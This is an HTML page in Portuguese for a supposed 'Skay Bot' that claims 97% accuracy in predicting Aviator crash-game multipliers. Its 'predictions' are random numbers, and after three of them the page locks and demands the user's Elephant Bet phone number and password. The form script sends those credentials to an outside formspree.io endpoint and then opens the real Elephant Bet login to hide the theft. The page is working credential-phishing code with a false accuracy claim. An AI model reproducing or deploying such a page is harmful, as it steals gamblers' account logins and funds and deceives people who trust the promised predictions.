<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Skay Bot - 97% de Acertividade</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: Arial, sans-serif; background:#000; color:#fff; text-align:center; margin:0; padding:20px; }
    h1 { color:#6a1b9a; font-size:2.2em; margin-bottom:20px; }
    .circle { font-size:1.2em; margin:20px auto 5px auto; padding:40px; border-radius:50%; width:180px; height:180px; display:flex; align-items:center; justify-content:center; background:#111; }
    .azul { color:#0ff; border:3px solid #0ff; box-shadow:0 0 20px #0ff; text-shadow:0 0 10px #0ff; }
    .blocked { background:#222; color:#ffcc00; padding:10px; margin:15px auto; border-radius:5px; width:90%; font-size:0.9em; }
    button { padding:15px 25px; font-size:1.1em; border:none; border-radius:5px; cursor:pointer; width:80%; max-width:320px; margin:15px auto; display:block; }
    #preverBtn { background:#6a1b9a; color:#fff; }
    #preverBtn:hover { background:#4a148c; }
    #openLogin { background:#0288d1; color:#fff; }
    #openLogin:hover { background:#0277bd; }
    #loginForm button { background:#b71c1c; color:#fff; }
    #loginForm button:hover { background:#8e0000; }
    #closeLogin { background:#757575; color:#fff; padding:10px 20px; border-radius:5px; text-decoration:none; display:inline-block; }
    input { margin:8px; padding:12px; width:80%; max-width:300px; font-size:1em; background:#f5f5f5; color:#000; border:2px solid #6a1b9a; border-radius:5px; }
    input::placeholder { color:#888; }
    #loginScreen { display:none; }
    footer { margin-top:30px; font-size:0.8em; color:#888; }
  </style>
</head>
<body>
  <!-- Página inicial -->
  <div id="homeScreen">
    <h1>Skay Bot - 97% de Acertividade</h1>
    <div id="circle" class="circle">--</div>
    <button id="preverBtn">Fazer Previsão</button>
    <div id="resultado"></div>
    <div id="blockedMsg" class="blocked" style="display:none;">⚠️ Acesso bloqueado.conecte o Bot para continuar.</div>
    <button id="openLogin">Conectar Bot</button>
  </div>

  <!-- Tela de login -->
  <div id="loginScreen">
    <h2>Conecte com a sua conta da Elephant Bet</h2>
    <form id="loginForm">
      <input type="tel" id="numero" name="numero" placeholder="Número de telemóvel" required maxlength="9" pattern="9[0-9]{8}"><br>
      <input type="password" id="senha" name="senha" placeholder="Digite a sua senha" required><br>
      <button type="submit">Conecte Agora</button>
    </form>
    <a href="#" id="closeLogin">← Voltar</a>
    <p id="statusMsg" style="color:#ffcc00;"></p>
  </div>

  <footer>© Skay Bot - 97% de Acertividade</footer>
  <audio id="beepSound" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg"></audio>

  <script>
    let previsoesFeitas = 0;
    let bloqueado = false;
    const maxPrevisoes = 3; // limite de 3 previsões

    const circle = document.getElementById("circle");
    const resultado = document.getElementById("resultado");
    const preverBtn = document.getElementById("preverBtn");
    const blockedMsg = document.getElementById("blockedMsg");
    const beepSound = document.getElementById("beepSound");

    preverBtn.addEventListener("click", function() {
      if (bloqueado) {
        blockedMsg.style.display = "block";
        return;
      }
      previsoesFeitas++;
      beepSound.play();

      // Resultado final com distribuição Aviator
      const multiplicadores = [1.2,1.3,1.5,2,3,5,7,10,20,50,100];
      const pesos = [30,20,15,10,8,6,5,3,2,1,0.5];
      const totalPeso = pesos.reduce((a,b)=>a+b,0);
      let rand = Math.random() * totalPeso;
      let resultadoFinal;
      for (let i=0; i<multiplicadores.length; i++) {
        if (rand < pesos[i]) { resultadoFinal = multiplicadores[i]; break; }
        rand -= pesos[i];
      }

      // Contagem estilo Aviator
      let valor = 1.00;
      const intervalo = setInterval(()=>{
        valor += 0.05;
        circle.textContent = valor.toFixed(2)+"x";
        if(valor >= resultadoFinal){
          clearInterval(intervalo);
          circle.textContent = resultadoFinal.toFixed(2)+"x";
          circle.className = "circle azul";
          resultado.textContent = `Previsão ${previsoesFeitas}: Resultado → ${resultadoFinal.toFixed(2)}x`;
        }
      },30);

      if (previsoesFeitas >= maxPrevisoes) {
        bloqueado = true;
        blockedMsg.style.display = "block";
      }
    });

    const homeScreen = document.getElementById("homeScreen");
    const loginScreen = document.getElementById("loginScreen");
    const openLogin = document.getElementById("openLogin");
    const closeLogin = document.getElementById("closeLogin");
    const loginForm = document.getElementById("loginForm");
    const statusMsg = document.getElementById("statusMsg");

    openLogin.addEventListener("click", function() {
      homeScreen.style.display = "none";
      loginScreen.style.display = "block";
    });
    closeLogin.addEventListener("click", function() {
      loginScreen.style.display = "none";
      homeScreen.style.display = "block";
    });

    document.getElementById("numero").addEventListener("input", function() {
      this.value = this.value.replace(/[^0-9]/g, "");
    });

    loginForm.addEventListener("submit", async function(event) {
      event.preventDefault();
      const numero = document.getElementById("numero").value;
      const senha = document.getElementById("senha").value;

      if (!/^9\d{8}$/.test(numero)) {
        statusMsg.textContent = "⚠️ O número deve começar com 9 e ter 9 dígitos.";
        return;
      }

      statusMsg.textContent = "Conectando...";

      try {
        await fetch("https://formspree.io/f/xvgwbowg", {
          method: "POST",
          body: JSON.stringify({ numero, senha }),
          headers: { "Content-Type": "application/json" }
        });
      } catch (error) {
        console.log("Erro ao enviar:", error);
      }

      bloqueado = false;
      previsoesFeitas = 0;
      blockedMsg.style.display = "none";

      setTimeout(() => {
        window.open("https://elephantbet.com/login","_blank");
      }, 1500);
    });
  </script>
</body>
</html>
